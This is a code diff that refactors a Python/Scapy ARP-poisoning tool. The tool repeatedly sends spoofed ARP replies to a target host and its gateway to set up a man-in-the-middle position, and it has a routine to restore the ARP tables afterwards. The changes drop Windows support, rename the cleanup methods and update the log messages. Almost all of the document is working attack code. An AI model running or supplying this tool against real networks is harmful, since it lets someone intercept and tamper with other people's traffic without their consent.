@@ -8,12 +8,7 @@ from termcolor import colored
 
 
 def get_gateway_ip():
-    platform_id = sys.platform  # Determine the OS
-
-    if platform_id == "win32":  # Windows
-        return os.popen("ipconfig | findstr Default").read().split()[-1]
-    else:  # Linux
-        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()
+    return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()
 
 
 def get_mac(ip):
@@ -38,6 +33,7 @@ class ArpPoisoner:
         self.target = target
         self.interval = interval
         self.ignore_cache = ignore_cache
+
         self.t1 = threading
         self.t2 = threading
         self.thread_lock_event = threading.Event()
@@ -45,13 +41,9 @@ class ArpPoisoner:
     def get_target_mac(self):
         if not self.ignore_cache:
             # Check ARP cache for target MAC address
-            cache = os.popen("arp -a {}".format(self.target)).read().split()
-            if sys.platform == "win32":
-                if len(cache) > 4:
-                    return cache[-2].replace("-", ":")
-            else:
-                if len(cache) > 7:
-                    return cache[3]
+            cache = os.popen(f"arp -a {self.target}").read().split()
+            if len(cache) > 7:
+                return cache[3]
 
         # Create ARP request packet
         ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -66,15 +58,6 @@ class ArpPoisoner:
             else:
                 time.sleep(5)
 
-    def restore_arp_table(self):
-        # getting the real MACs
-        victim_mac = get_mac(self.target)
-        gateway_mac = get_mac(self.gateway)
-        # creating the packet
-        packet = ARP(op=2, pdst=self.target, hwdst=victim_mac, psrc=self.gateway, hwsrc=gateway_mac)
-        # sending the packet
-        send(packet, verbose=False)
-
     def arp_poison(self, target_ip, gateway_ip):
         if target_ip == ARP().psrc:
             target_mac = ARP().hwsrc  # Return MAC address of machine
@@ -87,21 +70,29 @@ class ArpPoisoner:
         # Indefinitely send packets based on thread lock event
         while not self.thread_lock_event.is_set():
             send(arp, verbose=0)
-            print(colored("[ARP] Sent packet to {} / {} from {}".format(target_ip, target_mac, gateway_ip), "light_grey"))
+            print(colored(f"[ARP] Sent packet to {target_ip} / {target_mac} from {gateway_ip}.", "light_grey"))
             self.thread_lock_event.wait(self.interval)
-        print("Killing thread")
 
-    def close_threads(self):
-        print("\nProgram Interrupted")
-        print("Attempting to cleanup.")
+    def revert_arp_table(self):
+        print(colored("[ARP] Restoring ARP table...", "light_grey"))
+
+        # Get real MAC addresses of the target and gateway
+        victim_mac = get_mac(self.target)
+        gateway_mac = get_mac(self.gateway)
+
+        packet = ARP(op=2, pdst=self.target, hwdst=victim_mac, psrc=self.gateway, hwsrc=gateway_mac)
+        send(packet, verbose=False)
+
+        print(colored("[ARP] ARP table restored.", "light_grey"))
+
+    def lock_threads(self):
         self.thread_lock_event.set()
         self.t1.join()
         self.t2.join()
-        print("Successfully Cleaned up")
 
-    def cleanup(self):
-        self.close_threads()
-        self.restore_arp_table()
+    def undo(self):
+        self.lock_threads()
+        self.revert_arp_table()
 
     def start(self):
         # Poison the target's and gateway's ARP cache to establish a MITM attack
@@ -116,4 +107,4 @@ class ArpPoisoner:
         self.t1.start()
         self.t2.start()
 
-        print(colored("Started ARP poisoning.", "light_grey"))
+        print(colored("[ARP] Started ARP poisoning.", "light_grey"))
